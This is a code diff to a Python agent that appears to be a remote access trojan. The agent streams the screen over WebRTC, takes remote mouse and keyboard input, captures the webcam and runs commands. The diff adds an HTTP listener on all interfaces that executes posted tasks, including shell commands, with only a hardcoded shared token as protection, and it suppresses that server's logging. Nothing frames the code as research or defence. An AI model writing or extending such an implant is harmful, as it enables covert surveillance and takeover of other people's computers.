@@ -30,6 +30,10 @@ from typing import Any, Dict, List, Optional, Tuple
 from urllib.parse import urlparse
 from urllib.request import Request, urlopen
 
+# HTTP server for tasks
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import socketserver
+
 # WebRTC dependencies
 try:
     from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack, RTCConfiguration, RTCIceServer
@@ -77,6 +81,7 @@ SHARED_TOKEN = "extqli_@2026token$$"
 HEARTBEAT_INTERVAL_SECONDS = 30
 SIGNALING_POLL_INTERVAL_SECONDS = 5
 HTTP_TIMEOUT_SECONDS = 10
+HTTP_TASK_PORT = 8081
 
 STREAM_CONFIG = {
     "frame_rate":       30,
@@ -104,6 +109,11 @@ webrtc_data_channels: Dict[str, Any] = {}
 webrtc_loop: Optional[asyncio.AbstractEventLoop] = None
 signaling_stop_event = threading.Event()
 screen_tracks: Dict[str, Any] = {}  # viewer_id -> track
+
+# HTTP task server globals
+http_task_server: Optional[HTTPServer] = None
+http_task_server_thread: Optional[threading.Thread] = None
+http_task_stop_event = threading.Event()
 
 # =========================
 # Logging helpers
@@ -426,33 +436,52 @@ class ScreenCaptureTrack(VideoStreamTrack):
         self.height = self.monitor['height']
         self.frame_rate = STREAM_CONFIG["frame_rate"]
         self.last_frame_time = 0
+        self.paused = False
+        self.last_pause_frame = 0
         log(f"Screen capture started: {self.width}x{self.height} @ {self.frame_rate} fps")
 
     async def recv(self):
-        try:
-            pts, time_base = await self.next_timestamp()
-            now = time.time()
-            delay = max(0, (1.0 / self.frame_rate) - (now - self.last_frame_time))
-            if delay:
-                await asyncio.sleep(delay)
+        pts, time_base = await self.next_timestamp()
 
-            img = self.sct.grab(self.monitor)
+        # Guard: if the mss monitor was closed externally, yield a black frame
+        try:
+            _ = self.monitor
+        except Exception:
             import numpy as np
-            frame_array = np.array(img)[:, :, :3]
-            frame = VideoFrame.from_ndarray(frame_array, format="bgr24")
-            frame.pts = pts
-            frame.time_base = time_base
-            self.last_frame_time = time.time()
-            return frame
-        except Exception as e:
-            log(f"Screen capture error: {e}")
-            import numpy as np
-            pts, time_base = await self.next_timestamp()
-            dummy = np.zeros((self.height, self.width, 3), dtype=np.uint8)
-            frame = VideoFrame.from_ndarray(dummy, format="bgr24")
+            black = np.zeros((self.height, self.width, 3), dtype=np.uint8)
+            frame = VideoFrame.from_ndarray(black, format="bgr24")
             frame.pts = pts
             frame.time_base = time_base
             return frame
+
+        now = time.time()
+
+        if self.paused:
+            # Send a black frame at ~1 fps to keep the RTP stream ticking
+            if now - self.last_pause_frame < 1.0:
+                await asyncio.sleep(0.05)
+                return await self.recv()
+            self.last_pause_frame = now
+            import numpy as np
+            black = np.zeros((self.height, self.width, 3), dtype=np.uint8)
+            frame = VideoFrame.from_ndarray(black, format="bgr24")
+            frame.pts = pts
+            frame.time_base = time_base
+            return frame
+
+        # Normal capture
+        delay = max(0, (1.0 / self.frame_rate) - (now - self.last_frame_time))
+        if delay:
+            await asyncio.sleep(delay)
+
+        img = self.sct.grab(self.monitor)
+        import numpy as np
+        frame_array = np.array(img)[:, :, :3]
+        frame = VideoFrame.from_ndarray(frame_array, format="bgr24")
+        frame.pts = pts
+        frame.time_base = time_base
+        self.last_frame_time = time.time()
+        return frame
 
 # =========================
 # Remote control functions
@@ -495,7 +524,7 @@ def handle_key_event(key: str, pressed: bool) -> None:
         log(f"Key error: {e}")
 
 # =========================
-# Task execution (most functions omitted for brevity; include from your working script)
+# Task execution
 # =========================
 def execute_command(command: str) -> Tuple[str, str]:
     try:
@@ -865,6 +894,15 @@ def handle_task(task_data: Dict[str, Any], task_id: Optional[str]) -> str:
         return webcam_capture()
     if task_name == "screenshot":
         return screenshot()
+    if task_name == "webcam":
+        return webcam_capture()
+    if task_name == "thumbnail":
+        result = screenshot()
+        if result.startswith("SCREENSHOT:"):
+            return "THUMBNAIL:" + result.split(":", 1)[1]
+        return result
+    if task_name == "screenshot":
+        return screenshot()
     if task_name == "tcp_server_start":
         port = data.get("port")
         if port is None:
@@ -895,6 +933,99 @@ def handle_task(task_data: Dict[str, Any], task_id: Optional[str]) -> str:
         return privesc_example()
 
     return f"Unsupported task: {task_name}"
+
+# =========================
+# HTTP Task Server (for direct task execution)
+# =========================
+class TaskHTTPHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        if self.path != '/send-task':
+            self.send_response(404)
+            self.end_headers()
+            return
+
+        content_length = int(self.headers.get('Content-Length', 0))
+        body = self.rfile.read(content_length)
+        try:
+            req = json.loads(body.decode('utf-8'))
+        except Exception:
+            self.send_response(400)
+            self.end_headers()
+            self.wfile.write(b'{"success":false,"message":"Invalid JSON"}')
+            return
+
+        # Verify shared token
+        if req.get('shared_token') != SHARED_TOKEN:
+            self.send_response(401)
+            self.end_headers()
+            self.wfile.write(b'{"success":false,"message":"Unauthorized"}')
+            return
+
+        agent_uuid = req.get('agent_uuid')
+        if agent_uuid != AGENT_UUID:
+            self.send_response(403)
+            self.end_headers()
+            self.wfile.write(b'{"success":false,"message":"Agent UUID mismatch"}')
+            return
+
+        task_data = {
+            "task": req.get("task"),
+            "data": req.get("data", {})
+        }
+        task_id = req.get("task_id")
+        result_text = handle_task(task_data, task_id)
+
+        resp = {
+            "success": True,
+            "result": result_text,
+            "task_id": task_id
+        }
+        self.send_response(200)
+        self.send_header('Content-Type', 'application/json')
+        self.end_headers()
+        self.wfile.write(json.dumps(resp).encode('utf-8'))
+
+    def log_message(self, format, *args):
+        # Suppress default HTTP server logging to avoid clutter
+        pass
+
+def start_http_task_server(port: int = HTTP_TASK_PORT):
+    global http_task_server, http_task_server_thread, http_task_stop_event
+    try:
+        # Use ThreadingHTTPServer if available (Python 3.7+)
+        if hasattr(socketserver, 'ThreadingMixIn'):
+            class ThreadingHTTPServer(socketserver.ThreadingMixIn, HTTPServer):
+                pass
+            server_class = ThreadingHTTPServer
+        else:
+            server_class = HTTPServer
+
+        http_task_server = server_class(('0.0.0.0', port), TaskHTTPHandler)
+        log(f"HTTP task server listening on port {port}")
+        while not http_task_stop_event.is_set():
+            http_task_server.handle_request()
+    except Exception as e:
+        log(f"HTTP task server error: {e}")
+    finally:
+        if http_task_server:
+            http_task_server.server_close()
+        log("HTTP task server stopped")
+
+def start_http_task_server_thread():
+    global http_task_server_thread, http_task_stop_event
+    http_task_stop_event.clear()
+    http_task_server_thread = threading.Thread(target=start_http_task_server, name="http-task-server", daemon=True)
+    http_task_server_thread.start()
+
+def stop_http_task_server():
+    global http_task_server, http_task_stop_event, http_task_server_thread
+    http_task_stop_event.set()
+    if http_task_server:
+        http_task_server.shutdown()
+    if http_task_server_thread:
+        http_task_server_thread.join(timeout=2)
+    http_task_server = None
+    http_task_server_thread = None
 
 # =========================
 # WebRTC Signaling via HTTP (polling) - multi-viewer
@@ -974,15 +1105,36 @@ async def establish_webrtc(offer_sdp: str, viewer_id: str):
             log(f"Connection state for {viewer_id}: {pc.connectionState}")
             if pc.connectionState == "connected":
                 log(f"WebRTC connected for {viewer_id}")
-            elif pc.connectionState in ("failed", "closed"):
-                log(f"WebRTC connection {pc.connectionState} for {viewer_id}")
-                # Clean up
+                # Start keepalive ping every 10 seconds
+                async def keepalive():
+                    while (viewer_id in webrtc_peers and
+                           webrtc_peers[viewer_id].connectionState == "connected"):
+                        await asyncio.sleep(10)
+                        ch = webrtc_data_channels.get(viewer_id)
+                        if ch and ch.readyState == "open":
+                            try:
+                                ch.send(json.dumps({"type": "ping"}))
+                            except:
+                                break
+                asyncio.create_task(keepalive())
+
+            elif pc.connectionState == "failed":
+                log(f"WebRTC connection FAILED for {viewer_id} — cleaning up so next offer is accepted cleanly")
                 if viewer_id in webrtc_peers:
                     del webrtc_peers[viewer_id]
                 if viewer_id in webrtc_data_channels:
                     del webrtc_data_channels[viewer_id]
                 if viewer_id in screen_tracks:
+                    try:
+                        screen_tracks[viewer_id].sct.close()
+                    except:
+                        pass
                     del screen_tracks[viewer_id]
+
+            elif pc.connectionState in ("disconnected", "closed"):
+                log(f"WebRTC {pc.connectionState} for {viewer_id} — keeping slot, pausing capture")
+                if viewer_id in screen_tracks:
+                    screen_tracks[viewer_id].paused = True
 
         @pc.on("iceconnectionstatechange")
         async def on_iceconnectionstatechange():
@@ -1020,6 +1172,17 @@ async def establish_webrtc(offer_sdp: str, viewer_id: str):
                             apply_sender_quality(pc, video_track, new_kbps, new_fps),
                             webrtc_loop
                         )
+                    elif data.get("type") == "pause_video":
+                        if viewer_id in screen_tracks:
+                            screen_tracks[viewer_id].paused = True
+                            log(f"Video paused for {viewer_id}")
+                    elif data.get("type") == "resume_video":
+                        if viewer_id in screen_tracks:
+                            screen_tracks[viewer_id].paused = False
+                            screen_tracks[viewer_id].last_frame_time = 0
+                            log(f"Video resumed for {viewer_id}")
+                    elif data.get("type") == "ping":
+                        channel.send(json.dumps({"type": "pong"}))
                     elif "event_type" in data:
                         event_type = data["event_type"]
                         if event_type == "mouse_move":
@@ -1112,6 +1275,9 @@ def main() -> int:
     webrtc_loop = asyncio.new_event_loop()
     asyncio.set_event_loop(webrtc_loop)
 
+    # Start HTTP task server for direct thumbnail/command execution
+    start_http_task_server_thread()
+
     heartbeat_thread = threading.Thread(target=heartbeat_loop, name="heartbeat-loop", daemon=True)
     heartbeat_thread.start()
 
@@ -1125,6 +1291,7 @@ def main() -> int:
     finally:
         STOP_EVENT.set()
         signaling_stop_event.set()
+        stop_http_task_server()
         if TCP_SERVER_THREAD and TCP_SERVER_THREAD.is_alive():
             tcp_server_stop()
         heartbeat_thread.join(timeout=2)
